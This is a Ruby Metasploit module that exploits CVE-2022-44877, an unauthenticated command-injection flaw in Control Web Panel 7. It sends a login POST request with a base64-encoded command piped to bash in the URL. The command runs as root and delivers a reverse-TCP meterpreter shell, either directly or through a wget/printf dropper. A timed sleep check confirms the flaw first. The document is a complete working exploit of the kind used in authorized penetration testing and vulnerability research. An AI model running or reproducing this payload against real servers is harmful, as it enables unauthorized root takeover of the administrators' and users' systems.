##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/stopwatch'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Control Web Panel 7 (CWP) unauthenticated Remote Command Execution',
        'Description' => %q{
          This module exploits a remote command execution vulnerability in the Control Web Panel (CWP) application.
          The vulnerability allows an unauthenticated user to execute arbitrary code by using a special POST login request
          that creates a failed login entry in the `/var/log/cwp.log` using double quotes.
          The vulnerable endpoint is the admin login `/login/index.php?login=` which typically runs on port `2030` or `2086` for `http` and
          port `2031` and port `2087` for `https`. Successful exploitation results in command execution as the `root` user.
          CWP versions `0.9.8.1146` and below are vulnerable.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Numan Türle', # Discovery
          'h00die-gr3y <h00die.gr3y[at]gmail.com>' # MSF Module contributor
        ],
        'References' => [
          ['CVE', '2022-44877'],
          ['URL', 'https://github.com/numanturle/CVE-2022-44877'],
          ['URL', 'https://control-webpanel.com/changelog#1669855527714-450fb335-6194'],
          ['URL', 'https://attackerkb.com/topics/cvIPkChzTY/cve-2022-44877'],
          ['PACKETSTORM', '166383']
        ],
        'DisclosureDate' => '2023-01-09',
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X64],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['wget', 'printf', 'echo'],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter_reverse_tcp'
              }
            }
          ]
        ],
        # 'Payload' => {
        #  'BadChars' => '"' # We use this to denote the payload as a string so having it in the payload would escape things.
        # },
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 2031,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
  end

  def check_vuln(cmd)
    payload = Base64.strict_encode64(cmd)
    password = Rex::Text.rand_text_alphanumeric(8..16)
    return send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'login', "index.php?login=$(echo${IFS}#{payload}${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash)"),
      'vars_post' => {
        'username' => 'root',
        'password' => password.to_s,
        'commit' => 'Login'
      }
    })
  rescue StandardError => e
    elog("#{peer} - Communication error occurred: #{e.message}", error: e)
    return nil
  end

  def execute_command(cmd, _opts = {})
    payload = Base64.strict_encode64(cmd)
    password = Rex::Text.rand_text_alphanumeric(8..16)
    return send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'login', "index.php?$(echo${IFS}#{payload}${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash)"),
      'vars_post' => {
        'username' => 'root',
        'password' => password.to_s,
        'commit' => 'Login'
      }
    })
  rescue StandardError => e
    elog("#{peer} - Communication error occurred: #{e.message}", error: e)
    fail_with(Failure::Unknown, "Communication error occurred: #{e.message}")
  end

  def check
    print_status("Checking if #{peer} can be exploited.")
    # Take a high range to eliminate false positives with slow network / servers
    sleep_time = rand(8..15)
    print_status("Performing command injection test issuing a sleep command of #{sleep_time} seconds.")
    res, elapsed_time = Rex::Stopwatch.elapsed_time do
      check_vuln("sleep #{sleep_time}")
    end

    return CheckCode::Unknown('No response received from the target!') unless res
    return CheckCode::Safe unless res.code == 302 && !res.body.blank?

    print_status("Elapsed time: #{elapsed_time.round(2)} seconds.")
    return CheckCode::Safe('Command injection test failed.') unless elapsed_time >= sleep_time

    CheckCode::Vulnerable('Successfully tested command injection.')
  end

  def exploit
    case target['Type']
    when :unix_cmd
      print_status("Executing #{target.name} with #{payload.encoded}")
      execute_command(payload.encoded)
    when :linux_dropper
      print_status("Executing #{target.name}")
      execute_cmdstager(linemax: 262144)
    end
  end
end
